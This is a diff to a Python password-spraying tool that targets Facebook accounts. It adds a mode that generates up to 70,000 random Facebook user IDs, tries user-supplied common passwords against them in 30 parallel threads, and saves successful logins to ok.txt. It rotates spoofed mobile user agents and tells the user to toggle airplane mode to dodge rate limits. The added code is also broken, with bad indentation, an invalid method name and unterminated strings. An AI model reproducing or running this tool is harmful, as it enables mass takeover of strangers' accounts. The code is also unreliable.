@@ -127,7 +127,7 @@ class Main:
 		print("%s [%s💗%s] %sYOUR STATUS  : %s%s"%(G,R,G,G,G,stat))
 		print("\n\x1b[1;91m--------------------------------------------------------------------------------------------------------------------------------  ")
 		print("%s [%s1%s]%s RANDOM FACEBOOK ID 2009-2010 %s(PRO) V1"%(R,C,R,G,G))
-		#print("%s [%s2%s]%s RANDOM FACEBOOK ID 2011- %s(PRO) V1"%(R,C,R,G,G))
+		print("%s [%s2%s]%s RANDOM FACEBOOK ID 2005-2008 %s(PRO) V2"%(R,C,R,G,G))
 		#print("%s [%s3%s]%s RANDOM FACEBOOK ID FROM EMAIL %s(PRO) V0 "%(R,C,R,G,G))
 		print(GET)
 		hoga = input("\n%s [?] CHOICE : "%(G))
@@ -138,7 +138,15 @@ class Main:
 				self.old_9()
 			else: 
 				notice()
+				exit() 
+
+                elif hoga in ["2", "02"]:
+			if basesplit in plr:
+				self.old_9()
+			else: 
+				notice()
 				exit()
+
 
 	def old_9(self):
 		x = 111111111
@@ -167,17 +175,45 @@ class Main:
 					coeg.submit(self.api, user, listpass.split(","))
 			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
 		except Exception as e:exit(str(e))
+
+
+	def old5–8(self):
+		x = 111111111
+		xx = 999999999
+		idx = "100000"
+		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;95m(70,000 MAX): \033[0;92m"))
+		if (limit)>70000:
+			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(D))
+		try:
+			for n in range(limit):
+				_ = random.randint(x,xx)
+				__ = idx
+				self.id.append(__+str(_))
+			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			with ThreadPoolExecutor(max_workers=30) as coeg:
+				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(G,G,B,G))
+				print("%s EXAMPLE : %s123456,1234567,123456789"%(G,B))
+				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,P))
+				if len(listpass)<=5:
+					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(D))
+				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
+				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
+				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(B))
+				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 3 SECONDS\x1b[0m\n"%(D))
+				for user in self.id:
+					coeg.submit(self.api, user, listpass.split(","))
+			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
+		except Exception as e:exit(str(e))
+
 		
 		
 	def api(self, uid, pwx):
 		ua = random.choice([
 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
-			#"Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36;"
-			"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG-SM-G900A Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36;"
-			"Mozilla/5.0 (Linux; U; Android 9; ru-ru; Redmi 8 Build/PKQ1.190319.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.7.5-go;"
+			"Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36;
+			"Mozilla/5.0 (Linux; U; Android 9; ru-ru; Redmi 8 Build/PKQ1.190319.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.7.5-go;
 			"Opera/9.80 (Android; Opera Mini/28.0.2254/66.318; U; en) Presto/2.12.423 Version/12.16';]",
-			"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.06;"
-			#"Mozilla/5.0 (Linux; Android 9; Infinix X652A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36;"
+			"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.06;
 			
 		])
 		sys.stdout.write(
